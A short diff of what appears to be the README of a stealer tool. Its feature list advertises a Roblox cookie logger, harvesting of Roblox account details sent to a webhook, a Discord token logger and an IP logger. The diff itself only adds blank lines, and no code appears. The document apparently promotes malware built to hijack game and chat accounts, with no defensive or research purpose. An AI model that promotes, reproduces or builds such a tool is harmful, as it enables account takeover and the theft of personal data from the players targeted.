@@ -6,10 +6,13 @@
 
 # Features
 1; Roblox Cookie Logger
+
 2; Roblox Info Such As Roblox Friends, Followers, Username And Gamepasses All Sent To Webhook 
 
 # Extra Features
+
 1; Discord Token Logger
+
 2; Ip Logger
 
 # Sorry About the Gui It looks Ugly
